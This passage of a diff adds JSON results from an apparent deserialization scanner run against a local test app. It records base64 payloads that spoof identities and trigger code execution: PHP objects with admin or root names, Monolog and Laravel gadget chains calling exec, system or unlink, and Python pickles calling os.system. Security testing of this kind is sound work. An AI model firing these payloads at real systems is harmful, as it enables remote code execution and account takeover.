+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 256,
+            "body_sample": "{\"admin\":false,\"notifications\":[{\"text\":\"Welcome to Acme Portal (Python edition).\",\"time\":\"2 hours ago\"},{\"text\":\"Your preferences backup completed.\",\"time\":\"yesterday\"},{\"text\":\"New sign-in from a known device.\",\"time\":\"3 days ago\"}],\"username\":\"wiener\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/import",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/import",
+      "method": "POST",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 62,
+            "body_sample": "{\"restored\":\"{'theme': 'dark', 'lang': 'en'}\",\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
